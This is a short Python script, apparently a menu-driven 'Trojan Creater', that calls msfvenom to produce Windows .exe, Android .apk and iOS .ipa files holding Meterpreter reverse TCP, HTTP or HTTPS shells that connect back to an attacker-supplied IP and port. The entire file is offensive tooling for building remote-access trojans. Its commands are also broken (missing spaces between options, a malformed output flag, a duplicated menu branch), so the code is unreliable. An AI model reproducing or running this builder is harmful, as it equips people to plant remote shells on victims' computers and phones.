#!/usr/bin/env python

#-*- coding: utf-8 -*-



import os 

os.system("apt-get install figlet")

os.system("clear")

os.system("figlet Hacking Application Creater")

print("1) Windows (.exe)\n2) Android (.apk)\n3) Apple (.ipa)")

payload=input("Enter Payload: ")



if payload == '1':

	os.system("clear")

	os.system("figlet Windows Trojan Creater")

	print("\n")

	print("1) TCP\n2) HTTP\n3) HTTPS")

	selection = input("Selection:")

	if selection == '1':

		os.system("clear")

		ip = input("Enter İp: ")

		print("ip ==>",ip)

		port = input("Enter Port: ")

		print("Port ==>",port)

		saved = input("Where save and application name(.exe):")

		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+"LPORT="+port+ "-f exe -o+ "+saved)

		

	if selection == '2':

		os.system("clear")

		ip = input("Enter İp: ")

		print("ip ==>",ip)

		port = input("Enter Port: ")

		print("Port ==>",port)

		saved = input("Where save and application name(.exe):")

		os.system("msfvenom -p windows/meterpreter/reverse_http LHOST="+ip+"LPORT="+port+ "-f exe -o+ "+saved)

		

	if selection == '2':

		os.system("clear")

		ip = input("Enter İp: ")

		print("ip ==>",ip)

		port = input("Enter Port: ")

		print("Port ==>",port)

		saved = input("Where save and application name(.exe):")

		os.system("msfvenom -p windows/meterpreter/reverse_https LHOST="+ip+"LPORT="+port+ "-f exe -o+ "+saved)



if payload=='2':

	os.system("clear")

	os.system("figlet Android Trojan Creater")

	print("\n")

	print("1) TCP\n2) HTTP\n3) HTTPS")

	selection = input("Selection: ")

	if selection == '1':

		os.system("clear")

		ip = input("Enter İp: ")

		print("ip ==>",ip)

		port = input("Enter Port: ")

		print("Port ==>",port)

		saved = input("Where save and application name(.apk):")

		os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ip+"LPORT="+port+"R>"+saved)

	if selection == '2':

		os.system("clear")

		ip = input("Enter İp: ")

		print("ip ==>",ip)

		port = input("Enter Port: ")

		print("Port ==>",port)

		saved = input("Where save and application name(.apk):")

		os.system("msfvenom -p android/meterpreter/reverse_http LHOST="+ip+"LPORT="+port+"R>"+saved)

	if selection == '3':

		os.system("clear")

		ip = input("Enter İp: ")

		print("ip ==>",ip)

		port = input("Enter Port: ")

		print("Port ==>",port)

		saved = input("Where save and application name(.apk):")

		os.system("msfvenom -p android/meterpreter/reverse_https LHOST="+ip+"LPORT="+port+"R>"+saved)

		

if payload == '3':

	os.system("clear")

	os.system("figlet Apple Trojan Creater")

	print("\n")

	print("1) TCP\n2) HTTP\n3) HTTPS")

	selection = input("Selection: ")

	if selection == '1':

		os.system("clear")

		ip = input("Enter İp: ")

		print("ip ==>",ip)

		port = input("Enter Port: ")

		print("Port ==>",port)

		saved = input("Where save and application name(.ipa):")

		os.system("msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST="+ip+"LPORT="+port+"R>"+saved)

	if selection == '2':

		os.system("clear")

		ip = input("Enter İp: ")

		print("ip ==>",ip)

		port = input("Enter Port: ")

		print("Port ==>",port)

		saved = input("Where save and application name(.ipa):")

		os.system("msfvenom -p apple_ios/aarch64/meterpreter_reverse_http LHOST="+ip+"LPORT="+port+"R>"+saved)

	if selection == '3':

		os.system("clear")

		ip = input("Enter İp: ")

		print("ip ==>",ip)

		port = input("Enter Port: ")

		print("Port ==>",port)

		saved = input("Where save and application name(.ipa):")

		os.system("msfvenom -p apple_ios/aarch64/meterpreter_reverse_https LHOST="+ip+"LPORT="+port+"R>"+saved)





		

		

		

		

		

		

		

		

		

		

		

		

		
